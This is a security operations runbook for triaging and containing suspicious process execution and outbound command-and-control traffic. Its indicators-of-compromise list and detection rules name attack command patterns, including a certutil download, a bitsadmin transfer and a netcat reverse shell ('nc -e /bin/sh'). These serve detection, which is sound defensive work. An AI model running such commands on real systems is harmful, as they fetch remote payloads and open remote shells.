# IR-006 — Suspicious Process Execution and Outbound Command-and-Control

| | |
|---|---|
| **Severity range** | high |
| **MITRE ATT&CK** | T1105 Ingress Tool Transfer, T1218 System Binary Proxy Execution, T1204.002 Malicious File, T1059.003/.004 Shells, T1571 Non-Standard Port, T1071.001 Web Protocols |
| **Owner** | SOC L2 (endpoint + network) |
| **Target time to triage** | 15 min |

## 1. Detection

| Rule | Detection | Level | Source |
|---|---|---|---|
| 100140 | SOC-PROC-001 LOLBin file download (certutil / bitsadmin) | 12 | Sysmon 1 |
| 100141 | SOC-PROC-002 Office application spawns a shell / script host | 12 | Sysmon 1 |
| 100142 | SOC-PROC-003 Netcat with -e/-c (reverse/bind shell) | 12 | auditd EXECVE |
| 100200 | SOC-OUT-001 Script host outbound on a non-standard port | 12 | Sysmon 3 |
| 100201 | SOC-OUT-002 Suricata C2/malware signature from an internal host | 12 | Suricata |

## 2. Triage

1. Host, user, process image, parent, full command line; destination IP/port for network alerts.
2. Is the binary expected for this user/host (admin tooling, software deployment)?
3. Is there a preceding initial-access indicator (phishing document → 100141, web exploit → IR-003, brute force → IR-001)?
4. Any of these on a server or with a public destination → **high**; open the incident:
   `make investigate RULE=<rule id>`.

## 3. Investigation

* Full process tree around the alert (Sysmon `ProcessGuid` / auditd `ppid`, `ses`, `auid`).
* Files downloaded or written (Sysmon 11, certutil output path), their hashes and reputation.
* All connections to the destination from any host (Suricata flows, Sysmon 3) — scope the campaign.
* Linux: what spawned `nc`? (often the web server user → check IR-003 for the entry point).

## 4. Evidence collection

* Evidence bundle `runtime/evidence/<INC>/`.
* Memory image of the affected host **before** containment that kills processes.
* Downloaded files (quarantined copy + SHA-256), Prefetch/Amcache (Windows), `/proc/<pid>/` details (Linux).
* Suricata alerts/flows and PCAP for the destination.

## 5. Containment

* Network-isolate the host; block the destination IP/domain at firewall, proxy and DNS.
* Kill the malicious process after memory capture; disable the user if credentials may be stolen.

## 6. Eradication

* Remove downloaded payloads and persistence; reimage when integrity cannot be guaranteed.
* Block the LOLBin abuse path (ASR rules, AppLocker/WDAC), remove netcat from servers.

## 7. Recovery

* Restore from known-good images; rotate credentials used on the host.
* Monitor the destination and similar command lines across the fleet; re-run `make detection-test`.

## 8. Lessons learned

* Enable Office ASR "block child processes"; restrict outbound traffic from servers to required destinations only.
* Add new IOCs to CDB lists and a regression fixture for any missed variant.

## Logs to inspect

| Source | Events | Rules |
|---|---|---|
| Sysmon | 1 process, 3 network, 11 file create | 100131, 100140, 100141, 100200 |
| auditd | EXECVE / SYSCALL | 100142 |
| Suricata | alert / flow | 100201 |
| Proxy / DNS | requests to destination | — |

## Indicators of compromise

* `certutil -urlcache -split -f http…`, `bitsadmin /transfer`.
* `WINWORD.EXE → cmd.exe/powershell.exe`.
* `nc -e /bin/sh <ip> <port>`; PowerShell connecting to public IPs on ports like 4444.
* Suricata `ET MALWARE` / `CNC` signatures from internal sources.

## Escalation criteria

* Any confirmed execution of a downloaded payload or a live C2 connection → **declare an incident** and notify the incident manager.
* More than one host affected → major incident.
